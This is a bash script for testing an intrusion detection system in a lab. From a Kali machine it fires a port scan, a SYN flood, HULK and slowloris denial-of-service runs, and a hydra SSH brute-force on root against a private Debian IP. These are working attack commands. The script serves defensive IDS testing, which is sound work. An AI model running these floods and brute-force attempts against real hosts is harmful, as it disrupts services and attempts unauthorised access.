#!/bin/bash
# ============================================================
# click-IDS Attack Test (Kali -> Debian IDS host)
# Target : 192.168.145.129  (Debian, interface ens33, IDS app)
# Source : this machine  (Kali, eth0)
# Run as root:  sudo bash kali_attack_test.sh
# Stop anytime: Ctrl+C (cleanup of background jobs is automatic)
# ============================================================
TARGET="${1:-192.168.145.129}"
PAUSE="${2:-30}"          # seconds between attacks (must be > 10s flush)
RATE=8000                 # packets/sec for floods
COUNT=60000               # total hping3 packets per flood

LOG="attack_test_output.txt"
: > "$LOG"
 
hr() { printf '============================================\n' | tee -a "$LOG"; }
ok()  { printf '>>> %s [OK]\n' "$1" | tee -a "$LOG"; }
skip(){ printf '!!! %s [SKIPPED - tool missing]\n' "$1" | tee -a "$LOG"; }
run() { printf '### Running: %s\n' "$*" | tee -a "$LOG"; "$@" | tee -a "$LOG"; }

e() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOG"; }

cleanup() { pkill -f hulk 2>/dev/null; pkill -f slowhttptest 2>/dev/null; pkill hydra 2>/dev/null; e "Cleanup done."; }
trap cleanup EXIT

[ "$(id -u)" -eq 0 ] || { echo "Run as root: sudo bash $0"; exit 1; }
command -v nmap >/dev/null || apt-get install -y nmap >/dev/null 2>&1
command -v hping3 >/dev/null || apt-get install -y hping3 >/dev/null 2>&1
command -v hydra >/dev/null || apt-get install -y hydra >/dev/null 2>&1
command -v slowhttptest >/dev/null || apt-get install -y slowhttptest >/dev/null 2>&1

hr
e "Preflight ping $TARGET"
ping -c 2 "$TARGET" >/dev/null 2>&1 && ok "Network reachable" || { e "Target unreachable. Check Host-Only network."; exit 1; }
# Make sure the HTTP server on Debian is running before HTTP attacks
(exec 3<>/dev/tcp/$TARGET/8080) 2>/dev/null && ok "HTTP :8080 reachable" || e "WARN: no HTTP server on $TARGET:8080 (start python3 -m http.server 8080)"
(exec 3<>/dev/tcp/$TARGET/22)  2>/dev/null && ok "SSH :22 reachable"      || e "WARN: no sshd on $TARGET:22"

hr; e "=== [1/5] PortScan (expect: PortScan) ==="
run nmap -sS -T4 "$TARGET"

hr; sleep "$PAUSE"; e "=== [2/5] SYN Flood / DDoS (expect: DDoS) ==="
run hping3 -S --flood -p 8080 -c "$COUNT" "$TARGET" &

hr; sleep "$PAUSE"; e "=== [3/5] DoS Hulk (expect: DoS Hulk) ==="
if [ -f hulk.py ]; then
    run python3 hulk.py "http://$TARGET:8080/" &
else
    require_hulk="git clone https://github.com/grafov/hulk && python3 hulk.py";
    e "hulk.py missing -> skipping. To add: $require_hulk"
    skip "Hulk"
fi

hr; sleep "$PAUSE"; e "=== [4/5] Slowloris via slowhttptest (expect: DoS Slowhttptest / slowloris) ==="
run slowhttptest -c 200 -B -g -o slow_test -i 5 -r 100 -u "http://$TARGET:8080/"

hr; sleep "$PAUSE"; e "=== [5/5] SSH brute-force (expect: SSH-Patator) ==="
run hydra -l root -P /usr/share/wordlists/rockyou.txt -s 22 -t 4 -w 2 "$TARGET" ssh

hr
e "Done. Full log: $LOG"
e "1) Copy to Debian target, for CSV checks use:"
e "   python3 -c \"import pandas as pd; d=pd.read_csv('data/cleaned_flows_master.csv'); print(d.groupby('attack_type').size())\""
